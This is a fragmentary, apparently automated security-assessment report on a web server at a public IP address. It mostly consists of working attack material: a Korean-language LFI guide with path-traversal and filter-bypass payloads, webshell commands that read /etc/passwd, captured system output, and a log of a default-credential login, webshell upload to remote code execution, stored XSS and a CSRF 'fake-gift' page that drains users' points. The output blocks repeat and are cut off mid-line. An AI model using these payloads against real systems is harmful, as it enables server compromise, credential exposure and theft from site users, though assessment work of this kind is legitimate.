...
| **Assessment Date** | 2025-11-10 15:04:16 |
| **Duration** | 83 seconds |
...
**Output:**
```
apacheLFI 공격 가이드LFI 취약점 테스트 예제:1. 기본 LFI (차단됨):file.php?name=../../../etc/passwd ❌2. 우회 방법 - ../ 두 번만 사용:file.php?name=../../etc/passwd ✅file.php?name=../../etc/hosts ✅file.php?name=../config.php ✅3. ...
```
...
```
apacheLFI 공격 가이드LFI 취약점 테스트 예제:1. 기본 LFI (차단됨):file.php?name=../../../etc/passwd ❌2. 우회 방법 - ../ 두 번만 사용:file.php?name=../../etc/passwd ✅file.php?name=../../etc/hosts ✅file.php?name=../config.php ✅3. 절대 경로 사용:file.php?name=/etc/passwd ✅file.php?name=/var/www/html/config.php ✅4. 웹쉘 실행 (업로드한 .php5 파일):file.php?name=shell.php5&cmd=whoami ✅file.php?name=shell.php5&cmd=ls -la ✅file.php?name=shell.php5&cmd=cat /etc/passwd ✅5. 민감한 파일 읽기:file.php?name=../../config.php (DB 정보)file.php?name=/var/log/apach
```
</details>
...
```
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0LFI 공격 가이드LFI 취약점 테스트 예제:1. 기본 LFI (차단됨):file.php?name=../../../etc/passwd ❌2. 우회 방법 - ../ 두 번만 사용:file.php?name=../../etc/passwd ✅file.php?name=../../etc/hosts ✅file.php?name=../config.php ✅3. 절대 경로 사용:file.php?name=/etc/passwd ✅file.php?name=/var/www/html/config.php ✅4. 웹쉘 실행 (업로드한 .php5 파일):file.php?name=shell.php5&cmd=whoami ✅file.php?name=shell.php5&cmd=ls -la ✅file.php?name=shell.php5&cmd=cat /etc/passwd ✅5
```
</details>
...
```
/var/www/html/wwwLFI 공격 가이드LFI 취약점 테스트 예제:1. 기본 LFI (차단됨):file.php?name=../../../etc/passwd ❌2. 우회 방법 - ../ 두 번만 사용:file.php?name=../../etc/passwd ✅file.php?name=../../etc/hosts ✅file.php?name=../config.php ✅3. 절대 경로 사용:file.php?name=/etc/passwd ✅file.php?name=/var/www/html/config.php ✅4. 웹쉘 실행 (업로드한 .php5 파일):file.php?name=shell.php5&cmd=whoami ✅file.php?name=shell.php5&cmd=ls -la ✅file.php?name=shell.php5&cmd=cat /etc/passwd ✅5. 민감한 파일 읽기:file.php?name=../../config.php (DB 정보)file.php?name=/va
```
</details>
...
```
Linux ip-172-31-40-109.ap-northeast-2.compute.internal 6.1.155-176.282.amzn2023.x86_64 #1 SMP PREEMPT_DYNAMIC Tue Oct  7 15:53:25 UTC 2025 x86_64 x86_64 x86_64 GNU/LinuxLFI 공격 가이드LFI 취약점 테스트 예제:1. 기본 LFI (차단됨):file.php?name=../../../etc/passwd ❌2. 우회 방법 - ../ 두 번만 사용:file.php?name=../../etc/passwd ✅file.php?name=../../etc/hosts ✅file.php?name=../config.php ✅3. 절대 경로 사용:file.php?name=/etc/passwd ✅file.php?name=/var/www/html/config.php ✅4. 웹쉘 실행 (업로드한 .php5 파일):file.php?name=shell.php5&cmd=whoami 
```
</details>
...
USER=apache
SHLVL=0
_=/usr/bin/envLFI 공격 가이드LFI 취약점 테스트 예제:1. 기본 LFI (차단됨):file.php?name=../../../etc/passwd ❌2. 우회 방법 - ../ 두 번만 사용:file.php?name=../../etc/passwd ✅file.php?name=../../etc/hosts ✅file.php?name=../config.php ✅3. 절대 경로 사용:file.php?name=/etc/passwd ✅file.php?name=/var/www/html/config.php ✅4. 웹쉘 실행 (업로드한 .php5 파일):file.php?name=shell.php5&cmd=whoami ✅file.php?name=shell.php5&cmd=ls -la ✅file.php?name=shell.php5&cmd=cat /etc/passwd ✅5. 민감한 
```
</details>
...
root           1  0.0  0.4 172720 17020 ?        Ss   08:56   0:04 /usr/lib/systemd/systemd --switched-root --system --deserialize=32
...
**Details:**
- **Vulnerable URL:** `http://52.78.221.104/new_post.php`
- **Attack Type:** stored_xss_csrf_combined

**Impact:**
CRITICAL - Automatic point draining on page view, 1-time execution per user
...
|------|-------|----------|---------|
| 2025-11-10 15:04:16 | SCAN_START | INFO | Security assessment started on http://52.78.221.10... |
| 2025-11-10 15:04:31 | WEAK_CREDENTIALS | HIGH | Logged in with default credentials: admin/admin123... |
| 2025-11-10 15:04:39 | FILE_UPLOAD_RCE | CRITICAL | Successfully uploaded webshell: shell.jpg... |
| 2025-11-10 15:05:25 | RCE | CRITICAL | Remote Code Execution achieved via shell.jpg... |
| 2025-11-10 15:05:33 | STORED_XSS | HIGH | Stored XSS vulnerability confirmed: Basic script t... |
| 2025-11-10 15:05:40 | CSRF_EMBEDDED | CRITICAL | Embedded CSRF attack post created: Embedded fake-g... |
| 2025-11-10 15:05:40 | SETUP | INFO | Generated fake-gift.html attack page... |
| 2025-11-10 15:05:40 | SCAN_COMPLETE | INFO | Security assessment completed. 5 vulnerabilities f... |
...
*Assessment completed at: 2025-11-10 15:05:40*
*Duration: 83 seconds*
